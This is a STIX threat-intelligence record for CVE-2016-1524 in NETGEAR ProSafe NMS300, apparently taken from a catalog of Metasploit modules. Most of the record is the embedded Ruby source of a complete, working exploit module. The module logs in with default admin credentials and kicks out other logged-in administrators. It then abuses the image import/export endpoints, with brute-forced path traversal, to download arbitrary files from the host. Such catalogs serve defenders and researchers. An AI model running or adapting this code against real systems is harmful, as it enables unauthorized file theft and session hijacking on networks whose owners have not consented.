{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b36bf459-064f-4bfd-b7f3-aed3595b80a1",
    "created": "2024-08-14T16:23:16.704043Z",
    "modified": "2024-08-14T16:23:16.704047Z",
    "name": "NETGEAR ProSafe Network Management System 300 Authenticated File Download",
    "description": " Netgear's ProSafe NMS300 is a network management utility that runs on Windows systems. The application has a file download vulnerability that can be exploited by an authenticated remote attacker to download any file in the system. This module has been tested with versions 1.5.0.2, 1.4.0.17 and 1.1.0.13. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/netgear_auth_download.rb",
            "external_id": "netgear_auth_download.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-1524"
        },
        {
            "source_name": "reference",
            "url": "https://raw.githubusercontent.com/pedrib/PoC/master/advisories/netgear_nms_rce.txt"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2016/Feb/30"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'NETGEAR ProSafe Network Management System 300 Authenticated File Download',\n        'Description' => %q{\n          Netgear's ProSafe NMS300 is a network management utility that runs on Windows systems.\n          The application has a file download vulnerability that can be exploited by an\n          authenticated remote attacker to download any file in the system.\n          This module has been tested with versions 1.5.0.2, 1.4.0.17 and 1.1.0.13.\n        },\n        'Author' => [\n          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and updated MSF module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2016-1524'],\n          ['US-CERT-VU', '777024'],\n          ['URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/netgear_nms_rce.txt'],\n          ['URL', 'https://seclists.org/fulldisclosure/2016/Feb/30']\n        ],\n        'DisclosureDate' => '2016-02-04'\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('TARGETURI', [true, 'Application path', '/']),\n        OptString.new('USERNAME', [true, 'The username to login as', 'admin']),\n        OptString.new('PASSWORD', [true, 'Password for the specified username', 'admin']),\n        OptString.new('FILEPATH', [false, 'Path of the file to download minus the drive letter', '/Windows/System32/calc.exe']),\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptInt.new('DEPTH', [false, 'Max depth to traverse', 15])\n      ]\n    )\n  end\n\n  def authenticate\n    res = send_request_cgi({\n      'uri' => normalize_uri(datastore['TARGETURI'], 'userSession.do'),\n      'method' => 'POST',\n      'vars_post' => {\n        'userName' => datastore['USERNAME'],\n        'password' => datastore['PASSWORD']\n      },\n      'vars_get' => { 'method' => 'login' }\n    })\n\n    if res && res.code == 200\n      cookie = res.get_cookies\n      if res.body.to_s =~ /\"loginOther\":true/ && res.body.to_s =~ /\"singleId\":\"([A-Z0-9]*)\"/\n        # another admin is logged in, let's kick him out\n        res = send_request_cgi({\n          'uri' => normalize_uri(datastore['TARGETURI'], 'userSession.do'),\n          'method' => 'POST',\n          'cookie' => cookie,\n          'vars_post' => { 'singleId' => ::Regexp.last_match(1) },\n          'vars_get' => { 'method' => 'loginAgain' }\n        })\n        if res && res.code == 200 && (res.body.to_s !~ /\"success\":true/)\n          return nil\n        end\n      end\n      return cookie\n    end\n    return nil\n  end\n\n  def download_file(download_path, cookie)\n    filename = Rex::Text.rand_text_alphanumeric(rand(8..17)) + '.img'\n    begin\n      res = send_request_cgi({\n        'method' => 'POST',\n        'cookie' => cookie,\n        'uri' => normalize_uri(datastore['TARGETURI'], 'data', 'config', 'image.do'),\n        'vars_get' => {\n          'method' => 'add'\n        },\n        'vars_post' => {\n          'realName' => download_path,\n          'md5' => '',\n          'fileName' => filename,\n          'version' => Rex::Text.rand_text_alphanumeric(rand(8..9)),\n          'vendor' => Rex::Text.rand_text_alphanumeric(rand(4..6)),\n          'deviceType' => rand(999),\n          'deviceModel' => Rex::Text.rand_text_alphanumeric(rand(5..7)),\n          'description' => Rex::Text.rand_text_alphanumeric(rand(8..17))\n        }\n      })\n\n      if res && res.code == 200 && res.body.to_s =~ /\"success\":true/\n        res = send_request_cgi({\n          'method' => 'POST',\n          'cookie' => cookie,\n          'uri' => normalize_uri(datastore['TARGETURI'], 'data', 'getPage.do'),\n          'vars_get' => {\n            'method' => 'getPageList',\n            'type' => 'configImgManager'\n          },\n          'vars_post' => {\n            'everyPage' => rand(500..1498)\n          }\n        })\n\n        if res && res.code == 200 && res.body.to_s =~ /\"imageId\":\"([0-9]*)\",\"fileName\":\"#{filename}\"/\n          image_id = ::Regexp.last_match(1)\n          return send_request_cgi({\n            'uri' => normalize_uri(datastore['TARGETURI'], 'data', 'config', 'image.do'),\n            'method' => 'GET',\n            'cookie' => cookie,\n            'vars_get' => {\n              'method' => 'export',\n              'imageId' => image_id\n            }\n          })\n        end\n      end\n      return nil\n    rescue Rex::ConnectionRefused\n      print_error(\"#{peer} - Could not connect.\")\n      return\n    end\n  end\n\n  def save_file(filedata)\n    vprint_line(filedata.to_s)\n    fname = File.basename(datastore['FILEPATH'])\n\n    path = store_loot(\n      'netgear.http',\n      'application/octet-stream',\n      datastore['RHOST'],\n      filedata,\n      fname\n    )\n    print_good(\"File saved in: #{path}\")\n  end\n\n  def run\n    cookie = authenticate\n    if cookie.nil?\n      fail_with(Failure::Unknown, \"#{peer} - Failed to log in with the provided credentials.\")\n    else\n      print_good(\"#{peer} - Logged in with #{datastore['USERNAME']}:#{datastore['PASSWORD']} successfully.\")\n      store_valid_credential(user: datastore['USERNAME'], private: datastore['PASSWORD'], proof: cookie) # more consistent service_name and protocol\n    end\n\n    if datastore['FILEPATH'].blank?\n      fail_with(Failure::Unknown, \"#{peer} - Please supply the path of the file you want to download.\")\n      return\n    end\n\n    filepath = datastore['FILEPATH']\n    res = download_file(filepath, cookie)\n    if res && res.code == 200 && (res.body.to_s.bytesize != 0 && (res.body.to_s !~ /This file does not exist./) && (res.body.to_s !~ /operation is failed/))\n      save_file(res.body)\n      return\n    end\n\n    print_error(\"#{peer} - File not found, using bruteforce to attempt to download the file\")\n    count = 1\n    while count < datastore['DEPTH']\n      res = download_file(('../' * count).chomp('/') + filepath, cookie)\n      if res && res.code == 200 && (res.body.to_s.bytesize != 0 && (res.body.to_s !~ /This file does not exist./) && (res.body.to_s !~ /operation is failed/))\n        save_file(res.body)\n        return\n      end\n      count += 1\n    end\n\n    print_error(\"#{peer} - Failed to download file.\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-02-04"
}